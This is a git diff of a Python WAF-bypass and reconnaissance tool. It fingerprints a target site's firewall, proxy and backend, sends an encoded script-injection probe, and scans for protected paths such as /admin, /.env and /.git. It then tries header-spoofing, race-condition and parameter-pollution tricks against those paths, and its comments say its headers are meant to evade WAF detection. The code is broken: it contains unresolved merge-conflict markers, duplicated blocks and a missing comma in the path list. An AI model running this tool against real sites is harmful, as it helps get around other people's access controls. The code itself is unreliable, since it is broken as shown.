+            'cloudflare': ['cf-ray', 'cloudflare', 'error 1020'],
+            'aws-waf': ['awselb', 'aws', 'x-amzn'],
+            'imperva': ['incap_ses', 'visid_incap', 'imperva'],
+            'akamai': ['akamai', 'ak-bmsc'],
+            'wordfence': ['wordfence', 'this site is protected'],
+            'sucuri': ['sucuri', 'access denied.*sucuri'],
+            'barracuda': ['barracuda', 'bnsv'],
+            'f5': ['f5', 'bigip', 'x-wa-info'],
+            'fortinet': ['fortigate', 'fortiweb'],
+            'ispconfig': ['ispconfig', 'blocked by security policy', 'request rejected', 'web application firewall']
+        }
+
+        detected_waf = None
+
+        # Test standard GET parameters
+        for payload in waf_payloads['payloads']:
+            try:
+                response = self.session.get(
+                    f"{self.target_url}{payload}",
+                    headers=waf_payloads['headers'],
+                    timeout=10
+                )
+
+                # Analyze response for WAF signatures
+                full_response = f"{response.status_code} {response.headers} {response.text}".lower()
+
+                for waf, signatures in waf_signatures.items():
+                    for signature in signatures:
+                        if re.search(signature, full_response):
+                            detected_waf = waf
+                            break
+                    if detected_waf:
+                        break
+
+                if detected_waf:
+                    break
+
+            except Exception as e:
+                continue
+
+        # Test path injection for ISPConfig detection
+        if not detected_waf:
+            try:
+                markers = self.generate_unique_markers()
+                path_injection_payload = f"/test{markers['uuid']}%3cscript%3ealert(1)%3c/script%3e/"
+
+                response = self.session.get(
+                    f"{self.target_url}{path_injection_payload}",
+                    headers=waf_payloads['headers'],
+                    timeout=10
+                )
+
+                # Check specifically for ISPConfig path injection blocking
+                full_response = f"{response.status_code} {response.headers} {response.text}".lower()
+
+                if response.status_code == 403:
+                    for signature in waf_signatures['ispconfig']:
+                        if re.search(signature, full_response):
+                            detected_waf = 'ispconfig'
+                            break
+
+            except Exception as e:
+                pass
+
+        if detected_waf:
+            self.log_discovery("WAF", "Detection", detected_waf)
+            self.chain_map['layers'].append(f"WAF-{detected_waf}")
+        else:
+            self.log_discovery("WAF", "Detection", "None detected or unknown")
+
+    def proxy_fingerprinting(self, proxy_headers):
+        """Detect proxy/load balancer configuration"""
+        print("  🔄 Proxy Detection...")
+
+        try:
+            response = self.session.get(self.target_url, headers=proxy_headers['headers'])
+
+            proxy_indicators = {
+                'nginx': ['server.*nginx', 'x-nginx'],
+                'apache': ['server.*apache', 'x-apache'],
+                'haproxy': ['server.*haproxy'],
+                'traefik': ['server.*traefik'],
+                'envoy': ['server.*envoy', 'x-envoy'],
+                'istio': ['server.*istio'],
+                'linkerd': ['l5d-'],
+                'aws-alb': ['awsalb', 'elbv2'],
+                'gcp-lb': ['via.*google frontend']
+            }
+
+            detected_proxy = None
+            for proxy, indicators in proxy_indicators.items():
+                for indicator in indicators:
+                    for header, value in response.headers.items():
+                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
+                            detected_proxy = proxy
+                            break
+                if detected_proxy:
+                    break
+
+            if detected_proxy:
+                self.log_discovery("Proxy", "Detection", detected_proxy)
+                self.chain_map['layers'].append(f"Proxy-{detected_proxy}")
+
+        except Exception as e:
+            self.log_discovery("Proxy", "Error", str(e))
+
+    def backend_fingerprinting(self, backend_paths):
+        """Fingerprint backend application server"""
+        print("  🖥️ Backend Detection...")
+
+        backend_signatures = {
+            'apache': ['server.*apache'],
+            'nginx': ['server.*nginx'],
+            'iis': ['server.*iis', 'x-aspnet-version'],
+            'tomcat': ['server.*tomcat'],
+            'jetty': ['server.*jetty'],
+            'node': ['x-powered-by.*express', 'x-powered-by.*node'],
+            'php': ['x-powered-by.*php', 'server.*php'],
+            'python': ['server.*gunicorn', 'server.*uwsgi'],
+            'ruby': ['server.*puma', 'x-powered-by.*ruby'],
+            'go': ['server.*go']
+        }
+
+        detected_backend = None
+
+        for path in backend_paths['paths']:
+            try:
+                response = self.session.get(f"{self.target_url}{path}", timeout=5)
+
+                full_response = f"{response.headers} {response.text}".lower()
+
+                for backend, signatures in backend_signatures.items():
+                    for signature in signatures:
+                        if re.search(signature, full_response):
+                            detected_backend = backend
+                            break
+                    if detected_backend:
+                        break
+
+                if detected_backend:
+                    break
+
+            except Exception as e:
+                continue
+
+        if detected_backend:
+            self.log_discovery("Backend", "Detection", detected_backend)
+            self.chain_map['layers'].append(f"Backend-{detected_backend}")
+
+    def parser_discrepancy_testing(self):
+        """Test for parser discrepancies between layers"""
+        print("\n🔍 Phase 3: Parser Discrepancy Testing")
+        # Placeholder: Implement discrepancy testing logic
+        # Should include tests for:
+        # - URL encoding/decoding differences
+        # - Header normalization
+        # - Path traversal parsing
+        # - Content-type confusion
+        # - Special character handling
+        self.log_discovery("Parser", "Discrepancy", "Not yet implemented")
+
+    def generate_custom_bypasses(self):
+        """Generate custom payloads for bypassing detected layers"""
+        print("\n🔍 Phase 4: Bypass Payload Generation")
+        # Placeholder: Implement custom bypass generation logic based on discovered discrepancies
+        self.log_discovery("Bypass", "Payloads", "Not yet implemented")
+
+    def test_generated_bypasses(self):
+        """Test all generated bypass payloads against forbidden endpoint"""
+        print("\n🔍 Phase 5: Bypass Testing")
+        # Placeholder: Implement bypass testing logic
+        self.log_discovery("Bypass", "Testing", "Not yet implemented")
+
+    def generate_report(self):
+        """Generate detailed report of the analysis"""
+        print("\n📊 Phase 6: Report Generation")
+        report = {
+            'target_url': self.target_url,
+            'forbidden_endpoint': self.discovered_forbidden_endpoint,
+            'protocols': self.protocols,
+            'chain_map': self.chain_map,
+            'timestamp': datetime.utcnow().isoformat()
+        }
+        try:
+            report_path = f"traceroute_report_{int(time.time())}.json"
+            with open(report_path, "w") as f:
+                json.dump(report, f, indent=2)
+            print(f"  ✅ Report saved to {report_path}")
+        except Exception as e:
+            print(f"  ⚠️ Error saving report: {e}")
+
+        return report
+
+    # The enhancement requires this function for stack detection
+    def _detect_stack_type(self, endpoint: str) -> Optional[str]:
+        """Detect the stack type for a given endpoint"""
+        try:
+            response = self.session.head(endpoint)
+            headers = response.headers
+            if any(h in headers for h in ['cf-ray', 'cf-cache-status']):
+                return 'cloudflare_nginx'
+            elif any(h in headers for h in ['x-amzn-trace-id']):
+                return 'aws_waf_apache'
+            return None
+        except Exception:
+            return None
 
 class ApplicationTraceroute:
-    def __init__(self, target_url):
+    def __init__(self, target_url, forbidden_endpoint=None, skip_forbidden_tests=False):
         self.target_url = target_url.rstrip('/')
         self.parsed_url = urlparse(target_url)
         self.session = requests.Session()
+        self.service_discovery = ServiceDiscoveryEnhanced()
+        self.mesh_detector = ServiceMeshDetector()
+        self.request_tracker = RequestTracker()
+        self.payload_analyzer = PayloadAnalyzer()
+        self.stack_handler = StackHandler()
+        self.command_generator = None     
+
+        # Forbidden endpoint configuration
+        self.forbidden_endpoint = forbidden_endpoint
+        self.skip_forbidden_tests = skip_forbidden_tests
+        self.discovered_forbidden_endpoint = None
         
         # Chain discovery results
         self.chain_map = {
@@ -75,6 +1217,87 @@ class ApplicationTraceroute:
             'timestamp': str(int(time.time())),
             'sequence': str(random.randint(100000, 999999))
         }
+
+    def find_forbidden_endpoint(self):
+        """Find an endpoint that returns 403/401 for bypass testing"""
+        print("\n🔍 Phase 0: Finding Forbidden Endpoint for Testing")
+        # Browser-like headers per evitare detection WAF/anti-bot
+        browser_headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'it,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        }
+
+        
+        # Browser-like headers per evitare detection WAF/anti-bot
+        browser_headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'it,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        }
+        
+        # If specified by user, verify it's actually forbidden
+        if self.forbidden_endpoint:
+            try:
+                # Per cross-domain, aggiungere Referer
+                test_headers = browser_headers.copy()
+                forbidden_parsed = urlparse(self.forbidden_endpoint)
+                if forbidden_parsed.netloc != self.parsed_url.netloc:
+                    test_headers['Referer'] = self.target_url
+<<<<<<< HEAD:application_traceroute2.py
+                
+                response = self.session.get(self.forbidden_endpoint, headers=test_headers, timeout=10)
+=======
+
+                response = self.session.get(self.forbidden_endpoint, timeout=5)
+>>>>>>> c31d8fc (Riordinante le directory:):AppTraceroute/application_traceroute2.py
+                if response.status_code in [401, 403]:
+                    self.discovered_forbidden_endpoint = self.forbidden_endpoint
+                    self.log_discovery("Setup", "Forbidden Endpoint", f"User-provided: {self.forbidden_endpoint} ({response.status_code})")
+                    return self.forbidden_endpoint
+                else:
+                    print(f"  ⚠️ Provided endpoint returned {response.status_code}, not 403/401. Searching for alternatives...")
+            except Exception as e:
+                print(f"  ⚠️ Error checking provided endpoint: {e}")
+        
+        # Search for common protected endpoints
+        common_protected = [
+            '/admin', '/wp-admin', '/administrator', '/secure', '/api/admin',
+            '/manage', '/console', '/portal', '/control', '/private',
+            '/restricted', '/staff', '/backend', '/cpanel', '/webadmin',
+            '/.env', '/.git', '/config', '/phpmyadmin', '/adminer', '/users'
+            '/pages', '/root', '/uploads', '/includes', 'cgi-bin'
+        ]
+        
+        for endpoint in common_protected:
+            try:
+                url = self.target_url + endpoint
+<<<<<<< HEAD:application_traceroute2.py
+                response = self.session.get(url, headers=browser_headers, timeout=10, allow_redirects=False)
+=======
+                response = self.session.get(url, headers=browser_headers, timeout=5, allow_redirects=False)
+>>>>>>> c31d8fc (Riordinante le directory:):AppTraceroute/application_traceroute2.py
+                if response.status_code in [401, 403]:
+                    self.discovered_forbidden_endpoint = url
+                    self.log_discovery("Setup", "Forbidden Endpoint Found", f"{endpoint} ({response.status_code})")
+                    return url
+            except:
+                continue
+        
+        # If no forbidden endpoint found
+        if not self.skip_forbidden_tests:
+            print("  ⚠️ No forbidden endpoint found - some bypass tests will be limited")
+            print("  💡 Tip: Use --forbidden-endpoint to specify one, or --skip-forbidden-tests to skip these tests")
+        
+        return None
 
     def create_fingerprint_payloads(self):
         """Create payloads to fingerprint each layer in the chain"""
@@ -119,7 +1342,7 @@ class ApplicationTraceroute:
 
     async def protocol_discovery(self):
         """Discover supported protocols"""
-        print("🔍 Phase 1: Protocol Discovery")
+        print("\n🔍 Phase 1: Protocol Discovery")
         
         # HTTP/2 Detection
         try:
@@ -202,6 +1425,18 @@ class ApplicationTraceroute:
         # Backend Detection
         self.backend_fingerprinting(fingerprints['backend_detection'])
 
+    def _detect_stack_type(self, endpoint: str) -> Optional[str]:
+        """Detect the stack type for a given endpoint"""
+        response = self.session.head(endpoint)
+        headers = response.headers
+        
+        if any(h in headers for h in ['cf-ray', 'cf-cache-status']):
+            return 'cloudflare_nginx'
+        elif any(h in headers for h in ['x-amzn-trace-id']):
+            return 'aws_waf_apache'
+        
+        return None
+
     def waf_fingerprinting(self, waf_payloads):
         """Advanced WAF fingerprinting"""
         print("  🛡️ WAF Detection...")
@@ -215,11 +1450,13 @@ class ApplicationTraceroute:
             'sucuri': ['sucuri', 'access denied.*sucuri'],
             'barracuda': ['barracuda', 'bnsv'],
             'f5': ['f5', 'bigip', 'x-wa-info'],
-            'fortinet': ['fortigate', 'fortiweb']
+            'fortinet': ['fortigate', 'fortiweb'],
+            'ispconfig': ['ispconfig', 'blocked by security policy', 'request rejected', 'web application firewall']
         }
         
         detected_waf = None
         
+        # Test standard GET parameters
         for payload in waf_payloads['payloads']:
             try:
                 response = self.session.get(
@@ -244,7 +1481,53 @@ class ApplicationTraceroute:
                     
             except Exception as e:
                 continue
+<<<<<<< HEAD:application_traceroute2.py
         
+=======
+
+>>>>>>> c31d8fc (Riordinante le directory:):AppTraceroute/application_traceroute2.py
+        # Test path injection for ISPConfig detection
+        if not detected_waf:
+            try:
+                markers = self.generate_unique_markers()
+                path_injection_payload = f"/test{markers['uuid']}%3cscript%3ealert(1)%3c/script%3e/"
+<<<<<<< HEAD:application_traceroute2.py
+                
+=======
+
+>>>>>>> c31d8fc (Riordinante le directory:):AppTraceroute/application_traceroute2.py
+                response = self.session.get(
+                    f"{self.target_url}{path_injection_payload}",
+                    headers=waf_payloads['headers'],
+                    timeout=10
+                )
+<<<<<<< HEAD:application_traceroute2.py
+                
+                # Check specifically for ISPConfig path injection blocking
+                full_response = f"{response.status_code} {response.headers} {response.text}".lower()
+                
+=======
+
+                # Check specifically for ISPConfig path injection blocking
+                full_response = f"{response.status_code} {response.headers} {response.text}".lower()
+
+>>>>>>> c31d8fc (Riordinante le directory:):AppTraceroute/application_traceroute2.py
+                if response.status_code == 403:
+                    for signature in waf_signatures['ispconfig']:
+                        if re.search(signature, full_response):
+                            detected_waf = 'ispconfig'
+                            break
+<<<<<<< HEAD:application_traceroute2.py
+                            
+            except Exception as e:
+                pass
+        
+=======
+
+            except Exception as e:
+                pass
+       
+>>>>>>> c31d8fc (Riordinante le directory:):AppTraceroute/application_traceroute2.py
         if detected_waf:
             self.log_discovery("WAF", "Detection", detected_waf)
             self.chain_map['layers'].append(f"WAF-{detected_waf}")
@@ -411,7 +1694,9 @@ class ApplicationTraceroute:
             response1 = self.session.get(self.target_url, headers=ws_headers, timeout=2)
             
             # Step 2: Send normal request immediately after
-            response2 = self.session.get(f"{self.target_url}/admin", timeout=2)
+            # Use discovered forbidden endpoint if available
+            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
+            response2 = self.session.get(test_endpoint, timeout=2)
             
             if response2.status_code == 200:
                 discrepancy = {
@@ -716,13 +2001,21 @@ class ApplicationTraceroute:
         """Test Time-of-Check vs Time-of-Use race conditions"""
         print("  ⚡ Testing TOCTOU Race Conditions...")
         
+        # Skip if no forbidden endpoint found
+        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
+            print("    ⚠️ Skipping TOCTOU test - no forbidden endpoint available")
+            return
+        
         try:
             results = []
+            
+            # Use discovered forbidden endpoint or fallback
+            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/api/admin"
             
             def race_request(delay):
                 time.sleep(delay)
                 try:
-                    resp = self.session.get(f"{self.target_url}/api/admin", timeout=3)
+                    resp = self.session.get(test_endpoint, timeout=3)
                     results.append((delay, resp.status_code))
                 except:
                     results.append((delay, 'error'))
@@ -841,6 +2134,11 @@ class ApplicationTraceroute:
         
         # Service Mesh Headers
         try:
+            # Use discovered forbidden endpoint if available
+            test_endpoint = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
+            parsed_endpoint = urlparse(test_endpoint)
+            test_path = parsed_endpoint.path or '/admin'
+            
             k8s_headers = {
                 'X-Forwarded-Host': 'admin-service.default.svc.cluster.local',
                 'X-Envoy-Decorator-Operation': 'admin-service.admin.svc.cluster.local/*',
@@ -849,7 +2147,7 @@ class ApplicationTraceroute:
             }
             
             response = self.session.get(
-                f"{self.target_url}/admin",
+                test_endpoint,
                 headers=k8s_headers,
                 timeout=5
             )
@@ -1680,6 +2978,12 @@ class ApplicationTraceroute:
             print("  ℹ️ No bypasses to test")
             return
         
+        # Check if we have a forbidden endpoint to test against
+        if not self.discovered_forbidden_endpoint and not self.skip_forbidden_tests:
+            print("  ⚠️ No forbidden endpoint available for bypass validation")
+            print("  💡 Use --forbidden-endpoint to specify one for better validation")
+            return
+        
         for bypass in self.chain_map['bypasses']:
             success = self.validate_bypass(bypass)
             bypass['validated'] = success
@@ -1692,6 +2996,9 @@ class ApplicationTraceroute:
         try:
             print(f"    🔍 Testing {bypass['type']}: {bypass['description']}")
             
+            # Use discovered forbidden endpoint if available
+            test_url = self.discovered_forbidden_endpoint or f"{self.target_url}/admin"
+            
             if bypass['type'] in ['Unicode Bypass', 'Path Bypass']:
                 response = self.session.get(f"{self.target_url}{bypass['payload']}")
                 success = response.status_code not in [403, 406, 418, 429]
@@ -1699,7 +3006,7 @@ class ApplicationTraceroute:
                 return success
             
             elif bypass['type'] == 'Header Bypass':
-                response = self.session.get(self.target_url, headers=bypass['payload'])
+                response = self.session.get(test_url, headers=bypass['payload'])
                 success = response.status_code not in [403, 406, 418, 429]
                 print(f"      Response: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                 return success
@@ -1792,7 +3099,7 @@ class ApplicationTraceroute:
                     
                     def test_request():
                         try:
-                            response = self.session.get(f"{self.target_url}/admin", timeout=5)
+                            response = self.session.get(test_url, timeout=5)
                             results.append(response.status_code)
                         except:
                             results.append(0)
@@ -1818,8 +3125,8 @@ class ApplicationTraceroute:
             
             elif bypass['type'] == 'Parameter Pollution Bypass':
                 # Test parameter pollution
-                test_url = f"{self.target_url}/?param=safe&param=admin&PARAM=test"
-                response = self.session.get(test_url)
+                test_url_pollution = f"{test_url}?param=safe&param=admin&PARAM=test"
+                response = self.session.get(test_url_pollution)
                 success = response.status_code not in [403, 406, 418, 429]
                 print(f"      Parameter pollution: {response.status_code} ({'SUCCESS' if success else 'BLOCKED'})")
                 return success
@@ -1838,48 +3145,12 @@ class ApplicationTraceroute:
             print("\n⚠️ No bypasses to export")
             return None
         
-        # Extract technology stack information
-        technology_stack = {
-            'cdn': None,
-            'waf': None,
-            'proxy': None,
-            'backend': None,
-            'server': None,
-            'language': None,
-            'framework': None
-        }
-        
-        # Parse layers to extract specific technologies
-        for layer in self.chain_map['layers']:
-            layer_lower = layer.lower()
-            if 'cdn-' in layer_lower:
-                technology_stack['cdn'] = layer.split('-')[1]
-            elif 'waf-' in layer_lower:
-                technology_stack['waf'] = layer.split('-')[1]
-            elif 'proxy-' in layer_lower:
-                technology_stack['proxy'] = layer.split('-')[1]
-            elif 'backend-' in layer_lower:
-                technology_stack['backend'] = layer.split('-')[1]
-        
-        # Extract additional tech info from fingerprints
-        fingerprints = self.chain_map.get('fingerprints', {})
-        for category, details in fingerprints.items():
-            if isinstance(details, dict) and 'Detection' in details:
-                tech_type = category.lower()
-                if tech_type == 'server' and not technology_stack['server']:
-                    technology_stack['server'] = details['Detection']
-                elif tech_type == 'backend' and not technology_stack['backend']:
-                    technology_stack['backend'] = details['Detection']
-        
         # Prepare bypass data for JSON export
         export_data = {
             'target_url': self.target_url,
             'scan_timestamp': datetime.now().isoformat(),
-            'technology_stack': technology_stack,  # 🆕 Stack tecnologico all'inizio!
             'infrastructure_chain': self.chain_map['layers'],
-            'infrastructure_fingerprints': self.chain_map['fingerprints'],  # 🆕 Dettagli completi
             'total_discrepancies': len(self.chain_map['discrepancies']),
-            'discrepancies_found': self.chain_map['discrepancies'],  # 🆕 Discrepanze complete
             'total_bypasses': len(self.chain_map['bypasses']),
             'bypasses': []
         }
@@ -1907,13 +3178,8 @@ class ApplicationTraceroute:
             json.dump(export_data, f, indent=2, default=str)
         
         print(f"\n✅ Bypasses exported to: {filename}")
-        print(f"   🏗️ Technology Stack Detected:")
-        for tech, value in technology_stack.items():
-            if value:
-                print(f"      {tech.capitalize()}: {value}")
-        print(f"   📊 Total discrepancies: {len(export_data['discrepancies_found'])}")
-        print(f"   🎯 Total bypasses: {len(export_data['bypasses'])}")
-        print(f"   ✅ Validated: {len([b for b in export_data['bypasses'] if b['validated']])}")
+        print(f"   Total bypasses: {len(export_data['bypasses'])}")
+        print(f"   Validated: {len([b for b in export_data['bypasses'] if b['validated']])}")
         
         return filename
 
@@ -2004,6 +3270,12 @@ WebSocket: {"✅" if self.protocols['websocket'] else "❌"}
             for discovery_type, details in discoveries.items():
                 report += f"  - {discovery_type}: {details}\n"
         
+        # Add forbidden endpoint info
+        if self.discovered_forbidden_endpoint:
+            report += f"\n🚫 FORBIDDEN ENDPOINT: {self.discovered_forbidden_endpoint}\n"
+        elif not self.skip_forbidden_tests:
+            report += f"\n⚠️ NO FORBIDDEN ENDPOINT FOUND - Some tests were limited\n"
+        
         report += f"""
 🚨 PARSING DISCREPANCIES FOUND: {len(self.chain_map['discrepancies'])}
 """
@@ -2067,11 +3339,56 @@ Advanced techniques tested include:
         print("🚀 Starting Application Stack Traceroute Analysis")
         print("=" * 60)
         
+        # Phase 0: Find forbidden endpoint
+        self.find_forbidden_endpoint()
+
         # Phase 1: Protocol Discovery
         await self.protocol_discovery()
         
         # Phase 2: Infrastructure Fingerprinting
         self.infrastructure_fingerprinting()
+        service_map = self.service_discovery.discover_backend_chain(self.target_url)
+    
+        for service_endpoint in self.service_discovery.discovered_services:
+            # Service mesh detection
+            mesh_info = self.mesh_detector.detect_mesh(
+                self.session.headers,
+                self.service_discovery.service_tree[service_endpoint]
+            )
+            
+            if mesh_info['type']:
+                self.log_discovery("Service Mesh", mesh_info['type'], json.dumps(mesh_info['metadata']))
+            
+            # Request tracking
+            request_id = str(uuid.uuid4())
+            transformation = self.request_tracker.track_request(
+                request_id,
+                service_endpoint,
+                {'headers': self.session.headers}
+            )
+            
+            # Analyze payload mutations if present
+            if transformation['payload']:
+                mutations = self.payload_analyzer.analyze_mutations(
+                    self.chain_map.get('original_payload', {}),
+                    transformation['payload']
+                )
+                if mutations['type']:
+                    self.log_discovery("Payload Mutation", 
+                                     f"Types: {', '.join(mutations['type'])}",
+                                     f"Severity: {mutations['severity']}")
+            
+            # Stack-specific processing
+            stack_type = self._detect_stack_type(service_endpoint)
+            if stack_type:
+                processed_request = self.stack_handler.handle_request(
+                    stack_type,
+                    {'headers': self.session.headers}
+                )
+                if processed_request != {'headers': self.session.headers}:
+                    self.log_discovery("Stack Processing",
+                                     stack_type,
+                                     "Request modified for stack compatibility")
         
         # Phase 3: Parser Discrepancy Testing (Enhanced)
         self.parser_discrepancy_testing()
@@ -2088,26 +3405,39 @@ Advanced techniques tested include:
         print("\n" + "=" * 60)
         print("📊 ANALYSIS COMPLETE")
         print("=" * 60)
-        
+        # Generate command formats for discovered bypasses
+        for bypass in self.chain_map['bypasses']:
+            self.command_generator = CommandGenerator({
+                'url': self.target_url,
+                'headers': bypass.get('headers', {}),
+                'payload': bypass.get('payload', {})
+            })
+            bypass['curl_command'] = self.command_generator.generate_curl()
+            bypass['python_code'] = self.command_generator.generate_python()
         return self.generate_report()
 
 
 def main():
     import sys
+    import argparse
     
-    if len(sys.argv) != 2:
-        print("Usage: python application_traceroute.py <TARGET_URL>")
-        print("Example: python application_traceroute.py https://example.com")
-        sys.exit(1)
+    parser = argparse.ArgumentParser(description='Application Stack Traceroute - WAF/Proxy/Backend Chain Analysis')
+    parser.add_argument('target', help='Target URL to analyze')
+    parser.add_argument('--forbidden-endpoint', help='Known 403/401 endpoint for bypass testing (e.g. https://target.com/admin)')
+    parser.add_argument('--skip-forbidden-tests', action='store_true', help='Skip tests requiring forbidden endpoint')
     
-    target_url = sys.argv[1]
+    args = parser.parse_args()
     
     print("🔬 APPLICATION STACK TRACEROUTE - ENHANCED VERSION")
     print("🎯 Next-Generation Infrastructure Analysis with Advanced Bypass Techniques")
     print("=" * 70)
     
     async def run_analysis():
-        tracer = ApplicationTraceroute(target_url)
+        tracer = ApplicationTraceroute(
+            args.target,
+            forbidden_endpoint=args.forbidden_endpoint,
+            skip_forbidden_tests=args.skip_forbidden_tests
+        )
         report = await tracer.run_full_analysis()
         
         print(report)
